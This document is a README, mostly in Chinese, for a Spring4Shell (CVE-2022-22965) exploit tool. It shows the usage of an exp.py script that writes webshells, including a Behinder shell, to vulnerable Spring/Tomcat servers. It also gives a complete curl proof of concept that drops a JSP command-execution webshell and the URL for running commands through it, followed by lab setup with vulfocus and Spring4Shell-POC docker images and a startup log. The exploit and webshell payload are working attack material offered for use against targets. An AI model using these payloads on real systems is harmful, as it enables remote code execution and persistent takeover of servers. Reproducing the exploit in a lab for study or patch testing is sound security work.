## CVE-2022-22965: Spring-Core-Rce 

## EXP

特性:

1. 漏洞探测(不写入 webshell，简单字符串输出)
2. 自定义写入 webshell 文件名称及路径
3. 不会追加写入到同一文件中，每次检测写入到不同名称 webshell 文件
4. 支持写入 冰蝎 webshell
5. 代理支持，可以设置自定义的代理，比如: http://127.0.0.1:8080 

使用:

```python3
$ python3 exp.py -h
usage: exp.py [-h] --url URL --type TYPE [--directory DIRECTORY] [--filename FILENAME]
              [--proxy PROXY]

Srping Core Rce.

optional arguments:
  -h, --help            show this help message and exit
  --url URL             target url,eg: http://127.0.0.1:8082/helloworld/greeting
  --type TYPE           1 vuln test 2.Behinder shell
  --directory DIRECTORY
                        shell directory,eg: webapps/ROOT(Notice: if the path not exists will creat!)
  --filename FILENAME   shell name
  --proxy PROXY         set request proxy,eg: http://127.0.0.1:8080


```
比如：

```bash
$ python3 exp.py --url http://127.0.0.1:8082/helloworld/greeting --type 1 --proxy http://127.0.0.1:8080
[*] waiting for 10s...
[+] inject success, vulnerable!
[+] test at: http://127.0.0.1:8082/inject30297.jsp
[*] Response:
challenge
<!--

```

## POC

直接写入 webshell
```bash
curl -v -H "c1: runtime" -H "c2: <%" -H "suffix: %>//" -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" http://target:8080/path
```

The file is dropped to disk:

```
cat ./apache-tomcat-8.5.77/webapps/ROOT/tomcatwar.jsp 
- if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))3D-1){ out.println(new String(b)); } } -
```

shell: `target/tomcatwar.jsp?pwd=j&cmd=whoami`


### 环境搭建

#### 使用 vulfocus
ROOT.war 来自白帽汇的 vulfocus 镜像,直接放在 jdk9+ 的 tomcat 环境部署即可启动测试.

也可以自行使用 docker pull

```
docker run -d -p 8082:8080 --name springrce -it vulfocus/spring-core-rce-2022-03-29
```

然后访问 本地的 8082 端口，显示 OK,即运行成功


#### 使用 Spring4Shell-POC

克隆 https://github.com/lunasec-io/Spring4Shell-POC 然后进入 Spring4Shell-POC 执行 docker 编译启动即可

```
docker build -f Dockerfile . -t spring4shell && docker run -p 8082:8080 spring4shell

[+] Building 1.4s (12/12) FINISHED                                                                    
 => [internal] load build definition from Dockerfile                                             0.0s
 => => transferring dockerfile: 37B                                                              0.0s
 => [internal] load .dockerignore                                                                0.0s
 => => transferring context: 2B                                                                  0.0s
 => [internal] load metadata for docker.io/library/tomcat:9.0                                    1.3s
 => [internal] load build context                                                                0.0s
 => => transferring context: 965B                                                                0.0s
 => [1/7] FROM docker.io/library/tomcat:9.0@sha256:9920e45babbbda16cc0f7b939349e1443cc6e0922272  0.0s
 => CACHED [2/7] ADD src/ /helloworld/src                                                        0.0s
 => CACHED [3/7] ADD pom.xml /helloworld                                                         0.0s
 => CACHED [4/7] RUN apt update && apt install maven -y                                          0.0s
 => CACHED [5/7] WORKDIR /helloworld/                                                            0.0s
 => CACHED [6/7] RUN mvn clean package                                                           0.0s
 => CACHED [7/7] RUN mv target/helloworld.war /usr/local/tomcat/webapps/                         0.0s
 => exporting to image                                                                           0.0s
 => => exporting layers                                                                          0.0s
 => => writing image sha256:7b1b653307234587dde30fa2f26b2f3211b2bc8bdb38b4b43f2c321ddda1ee25     0.0s
 => => naming to docker.io/library/spring4shell                                                  0.0s

Use 'docker scan' to run Snyk tests against images to find vulnerabilities and learn how to fix them
NOTE: Picked up JDK_JAVA_OPTIONS:  --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/java.util.concurrent=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
01-Apr-2022 15:11:43.950 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/9.0.60
01-Apr-2022 15:11:43.956 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Mar 9 2022 14:52:25 UTC
01-Apr-2022 15:11:43.956 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 9.0.60.0
01-Apr-2022 15:11:43.956 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
01-Apr-2022 15:11:43.956 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.10.76-linuxkit
01-Apr-2022 15:11:43.957 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
01-Apr-2022 15:11:43.957 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/local/openjdk-11
01-Apr-2022 15:11:43.957 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           11.0.14.1+1
01-Apr-2022 15:11:43.957 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Oracle Corporation
01-Apr-2022 15:11:43.957 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /usr/local/tomcat
01-Apr-2022 15:11:43.957 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /usr/local/tomcat
01-Apr-2022 15:11:43.970 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.base/java.lang=ALL-UNNAMED
01-Apr-2022 15:11:43.970 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.base/java.io=ALL-UNNAMED
01-Apr-2022 15:11:43.971 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.base/java.util=ALL-UNNAMED
01-Apr-2022 15:11:43.971 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.base/java.util.concurrent=ALL-UNNAMED
01-Apr-2022 15:11:43.971 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
01-Apr-2022 15:11:43.971 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties
01-Apr-2022 15:11:43.972 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
01-Apr-2022 15:11:43.972 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
01-Apr-2022 15:11:43.972 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
01-Apr-2022 15:11:43.972 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
01-Apr-2022 15:11:43.973 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
01-Apr-2022 15:11:43.973 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/usr/local/tomcat
01-Apr-2022 15:11:43.973 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/usr/local/tomcat
01-Apr-2022 15:11:43.973 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/usr/local/tomcat/temp
01-Apr-2022 15:11:43.977 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent Loaded Apache Tomcat Native library [1.2.31] using APR version [1.7.0].
01-Apr-2022 15:11:43.977 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR capabilities: IPv6 [true], sendfile [true], accept filters [false], random [true], UDS [true].
01-Apr-2022 15:11:43.977 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR/OpenSSL configuration: useAprConnector [false], useOpenSSL [true]
01-Apr-2022 15:11:43.980 INFO [main] org.apache.catalina.core.AprLifecycleListener.initializeSSL OpenSSL successfully initialized [OpenSSL 1.1.1n  15 Mar 2022]
01-Apr-2022 15:11:44.251 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8080"]
01-Apr-2022 15:11:44.271 INFO [main] org.apache.catalina.startup.Catalina.load Server initialization in [511] milliseconds
01-Apr-2022 15:11:44.313 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
01-Apr-2022 15:11:44.313 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/9.0.60]
01-Apr-2022 15:11:44.329 INFO [main] org.apache.catalina.startup.HostConfig.deployWAR Deploying web application archive [/usr/local/tomcat/webapps/helloworld.war]
01-Apr-2022 15:11:45.358 INFO [main] org.apache.jasper.servlet.TldScanner.scanJars At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve startup time and JSP compilation time.

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::                (v2.6.3)

2022-04-01 15:11:45.952  INFO 1 --- [           main] c.r.helloworld.HelloworldApplication     : Starting HelloworldApplication v0.0.1-SNAPSHOT using Java 11.0.14.1 on 00bf66f10525 with PID 1 (/usr/local/tomcat/webapps/helloworld/WEB-INF/classes started by root in /helloworld)
2022-04-01 15:11:45.956  INFO 1 --- [           main] c.r.helloworld.HelloworldApplication     : No active profile set, falling back to default profiles: default
2022-04-01 15:11:46.614  INFO 1 --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 638 ms
2022-04-01 15:11:47.137  INFO 1 --- [           main] c.r.helloworld.HelloworldApplication     : Started HelloworldApplication in 1.618 seconds (JVM running for 3.594)
01-Apr-2022 15:11:47.157 INFO [main] org.apache.catalina.startup.HostConfig.deployWAR Deployment of web application archive [/usr/local/tomcat/webapps/helloworld.war] has finished in [2,828] ms
01-Apr-2022 15:11:47.169 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8080"]
01-Apr-2022 15:11:47.179 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in [2908] milliseconds
```

然后访问 http://127.0.0.1:8082/helloworld/greeting 
<img width="540" alt="image" src="https://user-images.githubusercontent.com/18260135/161292061-9c9d5432-caff-47f8-926b-7c33a1d891ec.png">

Reference：
- https://github.com/jbaines-r7/spring4shell_vulnapp 
- https://github.com/liangyueliangyue/spring-core-rce
- https://github.com/lunasec-io/Spring4Shell-POC
- https://www.t00ls.cc/thread-65239-1-1.html
